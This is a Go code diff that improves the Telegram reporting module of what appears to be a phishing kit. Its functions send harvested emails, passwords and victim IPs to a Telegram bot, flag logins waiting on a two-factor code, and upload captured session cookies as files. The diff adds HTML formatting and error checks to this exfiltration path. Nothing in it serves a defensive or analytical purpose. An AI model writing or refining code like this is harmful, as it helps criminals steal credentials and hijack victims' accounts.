@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"html"
+	"mime/multipart"
 	"net/http"
 	"time"
 )
@@ -22,8 +24,12 @@ func (t *TelegramSender) SendCredentials(source, email, password, ip string) err
 		return nil
 	}
 	
-	msg := fmt.Sprintf("🔐 New Submission\n\nSource: %s\nEmail: %s\nPassword: %s\nIP: %s\nTime: %s",
-		source, email, password, ip, time.Now().Format("2006-01-02 15:04:05"))
+	msg := fmt.Sprintf("🔐 <b>New Submission</b>\n\nSource: %s\nEmail: <code>%s</code>\nPassword: <code>%s</code>\nIP: %s\nTime: %s",
+		html.EscapeString(source), 
+		html.EscapeString(email), 
+		html.EscapeString(password), 
+		html.EscapeString(ip), 
+		time.Now().Format("2006-01-02 15:04:05"))
 	
 	return t.send(msg)
 }
@@ -33,8 +39,11 @@ func (t *TelegramSender) Send2FARequired(source, email, ip string) error {
 		return nil
 	}
 	
-	msg := fmt.Sprintf("⚠️ 2FA Required\n\nSource: %s\nEmail: %s\nIP: %s\nTime: %s\nStatus: Waiting for verification code",
-		source, email, ip, time.Now().Format("2006-01-02 15:04:05"))
+	msg := fmt.Sprintf("⚠️ <b>2FA Required</b>\n\nSource: %s\nEmail: <code>%s</code>\nIP: %s\nTime: %s\nStatus: <i>Waiting for verification code</i>",
+		html.EscapeString(source), 
+		html.EscapeString(email), 
+		html.EscapeString(ip), 
+		time.Now().Format("2006-01-02 15:04:05"))
 	
 	return t.send(msg)
 }
@@ -44,14 +53,16 @@ func (t *TelegramSender) SendSession(source, email, cookies string) error {
 		return nil
 	}
 	
-	msg := fmt.Sprintf("✅ Session Captured\n\nSource: %s\nEmail: %s\nTime: %s",
-		source, email, time.Now().Format("2006-01-02 15:04:05"))
+	msg := fmt.Sprintf("✅ <b>Session Captured</b>\n\nSource: %s\nEmail: <code>%s</code>\nTime: %s",
+		html.EscapeString(source), 
+		html.EscapeString(email), 
+		time.Now().Format("2006-01-02 15:04:05"))
 	
 	if err := t.send(msg); err != nil {
 		return err
 	}
 	
-	return t.sendFile(fmt.Sprintf("%s_%s_session.txt", source, email), cookies)
+	return t.sendFile(fmt.Sprintf("%s_session.txt", email), cookies)
 }
 
 func (t *TelegramSender) send(msg string) error {
@@ -67,7 +78,11 @@ func (t *TelegramSender) send(msg string) error {
 		return err
 	}
 	defer resp.Body.Close()
-	
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("telegram API error: %s", resp.Status)
+	}
+
 	return nil
 }
 
@@ -97,12 +112,16 @@ func (t *TelegramSender) sendFile(filename, content string) error {
 	if err := writer.Close(); err != nil {
 		return err
 	}
-	
+
 	resp, err := http.Post(url, writer.FormDataContentType(), body)
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
-	
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("telegram API error (file): %s", resp.Status)
+	}
+
 	return nil
 }
